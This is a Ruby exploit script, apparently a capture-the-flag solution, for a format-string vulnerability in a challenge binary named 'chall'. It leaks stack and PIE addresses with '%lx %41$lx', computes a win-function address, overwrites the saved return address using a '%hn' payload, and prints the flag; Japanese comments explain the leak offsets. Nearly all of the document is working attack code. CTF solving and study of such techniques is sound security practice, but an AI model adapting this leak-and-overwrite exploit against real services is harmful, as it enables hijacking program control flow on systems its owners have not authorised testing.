#!/usr/bin/env ruby
# coding: ascii-8bit

require 'pwn'

host = "localhost"
port = "9999"
if ARGV[0] == "r"
    host = ""
    port = ""
end

$z = Sock.new host, port
def z; $z; end

elf = ELF.new("chall")

# %6$lxで、スタックの一番上のアドレスが取得できる
# %41$lxで、PIEのアドレスがリークする
buf = "%lx %41$lx"
z.sendline buf
stack_address, pie_address_leak = z.recvuntil("\n").split(" ")
pie_base = pie_address_leak.to_i(16) - 748
if pie_base & 0xfff != 0
    puts "Invalid pie base #{pie_base.to_s(16)}"
end

win_addr = pie_base + 457
ret_address = stack_address.to_i(16) + 0x118
puts "[*] PIE base address: #{pie_base.to_s(16)}"
puts "[*] Stack address that saved return address: #{ret_address.to_s(16)}"
puts "[*] win function address: #{win_addr.to_s(16)}"

=begin
# How to construct a payload of format string attack

0x7ffe875aeef0|+0x0000|+000: 0x2563353030373525  <-  $rsp (Here is referred by %6$lx)
0x7ffe875aeef8|+0x0008|+001: 0x414141416e682438
0x7ffe875aef00|+0x0010|+002: 0x00007ffe875af008  <- This is return address of this call stack (%8$lx)
=end
payload = "%#{(win_addr + 1) & 0xffff}c%8$hnAAAA" + p64(ret_address)
z.sendline payload
data = z.recvuntil("\n")
puts "[*] #{data.slice(/ctf4b.*}/)}"
